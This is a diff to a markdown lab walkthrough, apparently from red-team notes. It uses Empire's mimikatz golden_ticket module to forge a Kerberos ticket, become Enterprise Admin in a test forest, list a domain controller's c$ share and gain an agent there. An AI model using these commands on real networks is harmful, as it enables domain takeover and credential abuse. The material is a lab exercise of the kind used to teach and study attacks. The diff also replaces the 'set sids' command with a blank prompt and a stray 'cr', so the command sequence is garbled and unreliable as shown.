@@ -174,16 +174,31 @@ We can now generate a golden ticket for `offense.local\Domain Admins`: since we 
 ```csharp
 usemodule powershell/credentials/mimikatz/golden_ticket
 (Empire: powershell/credentials/mimikatz/golden_ticket) > set user hakhak
-(Empire: powershell/credentials/mimikatz/golden_ticket) > set sids S-1-5-21-4172452648-1021989953-2368502130-519
+(Empire: powershell/credentials/mimikatz/golden_ticket) > 
+cr
 (Empire: powershell/credentials/mimikatz/golden_ticket) > set CredID 8
 (Empire: powershell/credentials/mimikatz/golden_ticket) > run
 ```
 
 ![](../../.gitbook/assets/empire-golden-ticket.png)
 
-The `CredID` property in the dcsync module comes from the Empire's credential store:
+The `CredID` property in the dcsync module comes from the Empire's credential store which previously got populated by our mimikatz'ing:
 
 ![](../../.gitbook/assets/empire-creds.png)
+
+We now should be Enterprise Admin in `offense.local`
+
+We can test it by listing the admin share c$ of the `dc-mantvydas.offense.local:`
+
+```csharp
+shell dir \\dc-mantvydas\c$
+```
+
+![](../../.gitbook/assets/empire-enterprise-admin.png)
+
+For the sake of fun and wrapping this lab up, let's get an agent from the `dc-mantvydas`:
+
+![](../../.gitbook/assets/empire-agent-from-rootdomain.png)
 
 {% embed data="{\"url\":\"https://enigma0x3.net/2016/01/28/an-empire-case-study/\",\"type\":\"link\",\"title\":\"An Empire Case Study\",\"description\":\"This post is part of the ‘Empire Series’, with some background and an ongoing list of series posts \[kept here\].  Empire has gotten a lot of use since its initial release at BSides Las Vegas. Most o…\",\"icon\":{\"type\":\"icon\",\"url\":\"https://s1.wp.com/i/favicon.ico\",\"aspectRatio\":0},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://enigma0x3.files.wordpress.com/2016/01/lab\_local\_krbtgt.png\",\"width\":1244,\"height\":1160,\"aspectRatio\":0.932475884244373}}" %}
 
